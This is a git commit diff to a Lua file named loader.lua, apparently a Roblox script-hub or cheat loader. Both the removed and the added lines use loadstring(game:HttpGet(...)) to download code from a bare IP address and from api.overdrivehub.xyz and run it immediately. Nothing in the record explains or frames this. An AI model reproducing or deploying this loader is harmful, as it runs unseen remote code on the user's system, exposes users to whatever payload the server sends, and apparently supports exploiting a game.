40f3107a1b7910d3e0dd1e3fd454d11f934403e5
fvs-creator <vincejoshuatiktok@gmail.com>
2026-02-27 13:50:13 +0800

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjdkZmU2OTliLTc3OGYtNDljZC1hYjVlLTNhNTc3YmFjODBmOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL2FwaS5vdmVyZHJpdmVodWIueHl6L3YxL2F1dGgifX0"))()
+ID="cf45c4cb-0354-43d9-828e-333c3f2c4ba6";
+RUN_AFTER=loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"));
+loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/loader.luau"))();
